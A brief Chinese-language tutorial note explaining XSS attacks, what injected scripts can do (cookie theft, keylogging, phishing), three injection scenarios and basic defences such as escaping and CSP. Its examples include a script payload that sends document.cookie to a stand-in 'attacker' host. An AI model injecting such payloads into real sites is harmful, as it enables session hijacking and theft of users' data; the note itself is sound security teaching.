# XSS

- [【译文】了解 XSS 攻击](https://zhuanlan.zhihu.com/p/21308080)

## 一、什么是 XSS

跨站点脚本（Cross-site scripting，XSS）是一种允许攻击者在另一个用户的浏览器中执行恶意脚本的脚本注入式攻击。

攻击者并不直接锁定受害者。而是利用一个受害者可能会访问的存在漏洞的网站，通过这个网站间接把恶意代码呈递给受害者。对于受害者的浏览器而言，这些恶意代码看上去就是网站正常的一部分，而网站也就无意中成了攻击者的帮凶。

## 二、恶意脚本能做啥

- **Cookie 窃取**：攻击者能够通过`document.cookie`访问受害者与网站关联的 cookie，然后传送到攻击者自己的服务器，接着从这些 cookie 中提取敏感信息，如 Session ID。
- **记录用户行为（Keylogging）**：攻击者可以使用 `addEventListener`方法注册用于监听键盘事件的回调函数，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。
- **钓鱼网站（Phishing）**：攻击者可以通过修改 DOM 在页面上插入一个假的登陆框，也可以把表单的`action`属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息。

## 三、场景

1. 用户直接文本提交，页面直接回显

```js
<script>window.location='http://attacker/?cookie='+document.cookie</script>
```

2. 用户搜索关键字，包含脚本，页面直接先是搜索历史

```html
<!-- http://website/search?keyword=<script>...</script> -->

<html>
  You searched for:
  <script>
    window.location = 'http://attacker/?cookie=' + document.cookie
  </script>
</html>
```

3. 页面链接配置了 JavaScript:

```js
document.querySelector('a').href = 'javascript:alert(document.cookie)'
```

## 四、避免

- 编码转义
- 过滤校验
- CSP (Content Security Policy)
